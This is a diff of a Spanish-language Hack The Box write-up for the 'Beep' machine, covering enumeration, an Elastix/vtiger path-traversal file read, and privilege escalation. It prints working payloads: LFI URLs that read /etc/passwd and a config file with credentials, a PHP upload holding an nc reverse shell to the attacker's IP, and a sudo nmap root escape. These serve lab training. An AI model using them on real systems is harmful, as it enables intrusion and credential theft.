@@ -2,6 +2,8 @@
 layout: post
 title: HTB_Beep
 date: 2023/07/10
+slug: HTB_Beep
+heroImage: /assets/machines.jpg
 ---
 
 # Beep {-}
@@ -15,15 +17,17 @@ El replay del live se puede ver aqui
 [![S4vitaar Beep maquina](https://img.youtube.com/vi/6pqd0QOc2Oc/0.jpg)](https://www.youtube.com/watch?v=6pqd0QOc2Oc)
 
 No olvideis dejar un like al video y un commentario...
+
 ## Enumeracion {-}
 
-### Reconocimiento de maquina, puertos abiertos y servicios {-} 
+### Reconocimiento de maquina, puertos abiertos y servicios {-}
 
 #### Ping {-}
 
 ```bash
 ping -c 1 10.10.10.7
 ```
+
 ttl: 63 -> maquina Linux
 
 #### Nmap {-}
@@ -35,11 +39,10 @@ nmap -p- --open -T5 -v -n 10.10.10.7
 Va lento
 
 ```bash
-nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.7 -oG allPorts 
+nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.7 -oG allPorts
 extractPorts allPorts
 nmap -sC -sV -p22,25,80,110,111,143,443,878,993,995,3306,4190,4445,4559,5038,10000, 10.10.10.7 -oN targeted
 ```
-
 
 | Puerto | Servicio      | Que se nos occure? | Que falta?           |
 | ------ | ------------- | ------------------ | -------------------- |
@@ -60,8 +63,6 @@ nmap -sC -sV -p22,25,80,110,111,143,443,878,993,995,3306,4190,4445,4559,5038,100
 | 5038   | asterisk      |                    |                      |
 | 10000  | http miniserv |                    |                      |
 
-
-
 ### Analyzando la web {-}
 
 #### Whatweb {-}
@@ -80,6 +81,7 @@ en un panel de authentificacion `elastix`.
 Si miramos el miniserv del puerto **10000** tambien vemos un panel de login.
 
 En este caso buscamos por una vulnerabilidad associada a `elastix`
+
 ## Vulnerability Assessment {-}
 
 ### Elastix {-}
@@ -95,10 +97,15 @@ Local File Inclusion.
 searchsploit -x 37637
 ```
 
-Vemos que el exploit pasa por una url que usa path traversal `/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action`
+Vemos que el exploit pasa por una url que usa path traversal.
+
+```php
+/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
+```
+
 En este caso el fichero `/etc/amportal.conf` lo miramos mas tarde y empezamos primero con enumerar informaciones de la maquina.
 
-Le metemos en firefox la url siguiente: `https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action`
+Le metemos en firefox la url siguiente: "https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action"
 y podemos ver el fichero.
 
 Vemos que hay multiples usuarios con una `/bin/bash`
@@ -136,7 +143,7 @@ python3
 En el caso de un LFI ficheros interessantes podrian tambien ser `/proc/shed_debug` y `/proc/shedstat`. En este caso no sirbe pero esta
 bien tenerlo en cuenta.
 
-Si miramos el fichero del exploit `https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..///etc/amportal.conf%00&module=Accounts&action`
+Si miramos el fichero del exploit "https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..///etc/amportal.conf%00&module=Accounts&action"
 Vemos un fichero de configuracion con credenciales para una base de datos.
 
 Si vamos por el panel de login y probamos usuarios, nos podemos connectar como el usuario admin.
@@ -150,31 +157,41 @@ Intentamos como el usuario root y la misma contraseña y entramos en el panel de
 
 ### Ganando accesso desde el vtiger {-}
 
-Si analyzamos la url `https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/net/fib_trie%00&module=Accounts&action`, vemos
-una parte que seria `https://10.10.10.7/vtigercrm`. Si vamos en esta url hay otro panel de session.
+Si analyzamos la url
+
+```bash
+https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/net/fib_trie%00&module=Accounts&action
+```
+
+, vemos una parte que seria
+
+```bash
+https://10.10.10.7/vtigercrm
+```
+
+. Si vamos en esta url hay otro panel de session.
 
 Copiando una vez mas las credenciales del usuario admin, podemos entrar en el dashboard de **vtiger CRM**.
 
 Aqui la idea para ganar accesso al systema, viene de una vulnerabilidad que pasa por cambiar el logo de la compania con un fichero de doble extension.
 
-Si vamos a `Settings > Settings > Company Details > edit`, aqui vemos que podemos cargar un fichero `.jpg` para cambiar el logo de la empresa.
+Si vamos a "Settings > Settings > Company Details > edit", aqui vemos que podemos cargar un fichero `.jpg` para cambiar el logo de la empresa.
 
 1. Creamos un fichero con doble extension s4vishell.php.jpg
 
-    ```php
-    <?php
-        system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.15 443 >/tmp/f");
-    ?>
-    ```
+   ```php
+   <?php
+       system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.15 443 >/tmp/f");
+   ?>
+   ```
 
 1. Nos ponemos en escucha por el puerto 443
 
-    ```bash
-    nc -nlvp 443
-    ```
+   ```bash
+   nc -nlvp 443
+   ```
 
 1. Uploadeamos el fichero a la web y cuando le damos a save ya hemos ganado accesso al systema.
-
 
 ```bash
 whoami
@@ -197,9 +214,6 @@ stty -a
 
 stty rows <rownb> columns <colnb>
 ```
-
-
-
 
 ## Privilege Escalation {-}
 
@@ -226,7 +240,7 @@ nmap --version
 sudo nmap --interactive
 !sh
 whoami
-#Output 
+#Output
 root
 ```
 
@@ -241,15 +255,14 @@ Un shellshock attack pasa por burlar el user-agent de la peticion. Para esto uti
 
 1. Una vez interceptada la peticion a la url de login.cgi, cambiamos la cabezera del User-Agent de la siguiente forma:
 
+![Bee-shellshock-reverse-shell](/assets/images/Beep-shellshock-reverse-shell.png)
 
-![Bee-shellshock-reverse-shell](/assets/images/Beep-shellshock-reverse-shell.png) 
 1. Nos ponemos en escucha por el puerto 443
 
-    ```bash
-    nc -nlvp 443
-    ```
+   ```bash
+   nc -nlvp 443
+   ```
 
 1. En Burpsuite le damos a Forward
 
 Y ganamos accesso al systema como el usuario root ;)
-
